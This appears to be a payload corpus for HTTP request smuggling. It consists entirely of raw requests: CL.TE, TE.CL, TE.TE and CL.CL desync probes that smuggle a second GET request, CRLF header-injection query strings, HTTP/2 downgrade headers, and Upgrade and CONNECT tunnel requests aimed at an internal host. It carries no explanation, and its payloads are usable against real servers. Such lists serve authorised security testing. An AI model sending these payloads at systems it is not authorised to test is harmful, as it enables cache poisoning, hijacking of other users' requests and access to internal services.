# Detection payloads — the probe corpus by pair

## CL.TE detection — the hang-probes

```text
POST / HTTP/1.1
Host: t
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

```text
POST / HTTP/1.1
Host: t
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

```text
POST / HTTP/1.1
Host: t
Content-Length: 6
Transfer-Encoding: chunked

0

```

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

0

GET /
```

## TE.CL detection — the 404-poisons

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /404-poison HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

71
GET /search?q=MARKER HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

## TE.TE detection — the obfuscation + 404

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
GET /404 HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding : chunked

5c
GET /404 HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked,chunked

5c
GET /404 HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

## CL.CL detection — the dup-CL

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Content-Length: 7

A=1&B=2
```

```text
POST / HTTP/1.1
Host: t
Content-Length: 7
Content-Length: 4

A=1&B=2
```

## CL.0 detection — the body-ignored

```text
POST /redirect HTTP/1.1
Host: t
Content-Length: 45

GET /marker HTTP/1.1
Host: t
```

```text
HEAD / HTTP/1.1
Host: t
Content-Length: 45

GET /marker HTTP/1.1
Host: t
```

## CRLF detection — the folds

```text
?host=x%0d%0aX-Inj:%201
?host=x%0aX-Inj:%201
?host=x%0dX-Inj:%201
?host=x%250d%250aX-Inj:%201
?host=x%e5%98%8aX-Inj:%201
?host=x%0d%0a%20X-Inj:%201
?host=x%0d%0a%0d%0aGET%20/marker
```

## h2 detection — the downgrade headers

```text
:method POST
:path /
:authority t
content-length 0
+ DATA bytes
```

```text
:method POST
:path /
:authority t
transfer-encoding chunked
+ DATA bytes
```

## Upgrade detection — the tunnels

```text
GET / HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

```text
GET / HTTP/1.1
Upgrade: h2c
Connection: Upgrade, HTTP2-Settings
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
```

```text
CONNECT internal:80 HTTP/1.1
Host: t
```
